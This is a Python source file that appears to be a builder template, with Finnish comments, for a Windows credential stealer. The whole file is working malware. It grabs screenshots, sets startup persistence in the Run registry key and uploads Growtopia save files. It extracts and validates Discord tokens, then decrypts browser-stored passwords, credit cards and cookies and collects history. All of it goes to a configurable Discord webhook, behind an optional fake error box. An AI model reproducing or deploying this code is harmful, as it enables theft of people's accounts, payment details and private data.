import os, requests, winreg, tempfile
from PIL import ImageGrab
import ctypes
from ctypes import wintypes
import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

key = r"Software\Microsoft\Windows\CurrentVersion\Run"

# error viesti boxi mikä onkaa, tääki ny tkinteri sijasta tähän nii paljo parempi.
MessageBox = ctypes.windll.user32.MessageBoxW
MessageBox.restype = ctypes.c_int
MessageBox.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.UINT]
MB_OK = 0x00000000
MB_ICONERROR = 0x00000010 # icon

# configurointii vähä täs
exe_file = '{EXE}'
dc = '{DC}'
screenshot = {screenshot}
startup = {startup}
feikki = {feikkiteksti}
feikkitext = '{txt}'
salasanat = {salasana}
token = {tokeni}


#itse koodi tässä
if screenshot == True:
    screenshot = ImageGrab.grab()
    temp_file = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
    screenshot.save(temp_file.name)
    requests.post(dc, files={'file': open(temp_file.name, 'rb')})
    temp_file.close()
    os.unlink(temp_file.name)

if startup == True:
    full_path = os.path.join(os.getcwd(), exe_file)
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
        winreg.SetValueEx(reg_key, exe_file, 0, winreg.REG_SZ, full_path)

d = os.path.join(os.getenv('LOCALAPPDATA'), 'Growtopia', 'save.dat')
with open(d, 'rb') as file:
    files = {'file': file}
    requests.post(dc, files=files)

if token == True:
    tokens = []
    cleaned = []
    checker = []

    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"
    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except: pass
        return ip
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    def get_token():
        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error": continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except: continue
                        if res.status_code == 200:
                            res_json = res.json()
                            ip = getip()
                            pc_username = os.getenv("UserName")
                            pc_name = os.getenv("COMPUTERNAME")
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            embed = f"""**{user_name}** *({user_id})*\n
    > :bust_in_silhouette: __Account Information__\n\tEmail: ||`{email}`||\n\tPhone: ||`{phone}`||\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires: `{days_left if days_left else "None"} day(s)`\n
    > :computer: __PC Information__\n\tIP: ||`{ip}`||\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
    > :coin: __Token__\n \t ||`{tok}`||\n
    **Made by github.com/east-22**| ||.gg/sveX2NFJ||"""
                            payload = json.dumps({'content': embed, 'username': 'E-Builder | Made by east', 'avatar_url': 'https://raw.githubusercontent.com/69east/assets/main/logo.png'})
                            try:
                                headers2 = {
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                                }
                                req = Request(dc, data=payload.encode(), headers=headers2)
                                urlopen(req)
                            except: continue
                    else: continue

    get_token()


if salasanat == True:
    appdata = os.getenv('LOCALAPPDATA')

    browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }

    data_queries = {
        'login_data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Email', 'Password'],
            'decrypt': True
        },
        'credit_cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
            'decrypt': True
        },
        'cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Visited Time'],
            'decrypt': False
        },
        'downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
            'columns': ['Download URL', 'Local Path'],
            'decrypt': False
        }
    }


    def get_master_key(path: str):
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key


    def decrypt_password(buff: bytes, key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass


    def save_results(content):
        try:
            if content:
                # Save the combined content to a temporary text file
                temp_file_path = 'temp_content.txt'
                with open(temp_file_path, 'w', encoding="utf-8") as temp_file:
                    temp_file.write(content)
                
                # Check if the temporary text file is empty
                if os.path.getsize(temp_file_path) > 0:
                    # Send the combined content as a text file to the Discord webhook
                    with open(temp_file_path, 'rb') as file:
                        file_payload = {
                            'file': ('browser_data.txt', file)
                        }
                        file_response = requests.post(dc, files=file_payload)
                        
                        if file_response.status_code == 204:
                            print(f"\t [+] File successfully posted to Discord!")
                        else:
                            print(f"\t [-] Failed to post file to Discord. Status code: {file_response.status_code}")
                else:
                    print(f"\t [-] The file {temp_file_path} is empty. Not sending the file.")
                
                # Remove the temporary text file
                os.remove(temp_file_path)
            
            else:
                print(f"\t [-] No Data Found!")
        except Exception as e:
            print(f"\t [-] Error: {e}")


    def get_data(path: str, profile: str, key, type_of_data):
        db_file = f'{path}\\{profile}{type_of_data["file"]}'
        if not os.path.exists(db_file):
            return ""
        result = ""
        try:
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result
        except:
            try:
                os.remove('temp_db')
            except:
                pass
            return ""


    def convert_chrome_time(chrome_time):
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


    def installed_browsers():
        available = []
        for x in browsers.keys():
            if os.path.exists(browsers[x]):
                available.append(x)
        return available


    available_browsers = installed_browsers()
    combined_content = ""

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                combined_content += f"{browser} - {data_type_name}\n\n{data}\n"
            print("\t------\n")

    save_results(combined_content)
if feikki == True:
    MessageBox(None, feikkitext, 'Error', MB_OK | MB_ICONERROR)
